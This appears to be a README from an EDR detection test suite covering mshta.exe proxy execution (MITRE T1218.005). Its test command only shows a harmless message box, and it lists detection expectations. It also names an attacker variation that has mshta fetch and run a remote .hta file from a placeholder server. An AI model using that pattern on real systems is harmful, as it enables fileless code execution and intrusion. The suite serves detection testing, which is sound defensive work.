# 11. Execution via mshta (LOLBin)

[Portugues](../../11-execucao-mshta/README.md) | **English**

**MITRE ATT&CK tactic:** Defense Evasion and Execution
**ID:** T1218.005
**Expected severity:** High
**Needs admin:** No
**Destructive:** No

## What it is for, from the attacker point of view

mshta.exe is a native Windows program made to run HTML applications, the files with the .hta extension. The problem is that it also executes scripts, in VBScript or JScript, embedded, including straight from a URL. The attacker uses mshta to run code without saving an executable file to disk, which makes signature based detection harder.

## Why it is dangerous

It is one more LOLBin, a legitimate tool used for evil. The code runs by the hand of a trusted Microsoft program. It is often used right at the first access, when the victim opens an attachment, and because it is fileless, it escapes defenses that only look at files written to disk.

## Analogy

It is like using the meeting room projector, a common and trusted piece of equipment, to display instructions to the gang. No one finds the projector being on strange, and nothing is left written on paper to be found later.

## What the script does

Runs mshta.exe with a harmless embedded script that only shows a message and closes. No real download is performed. The goal is to demonstrate the pattern of mshta running a script.

## Example command

```cmd
mshta.exe vbscript:Execute("MsgBox ""Teste EDR - mshta"":close")
```

Variation used by attackers, mshta http://server/file.hta

## What the EDR should detect

* mshta.exe executing a script, especially with vbscript or a URL.
* The System Binary Proxy Execution pattern, T1218.005, high severity.

## Prerequisites

* No special privilege.

## Cleanup

* Nothing to clean. The test writes nothing to disk.
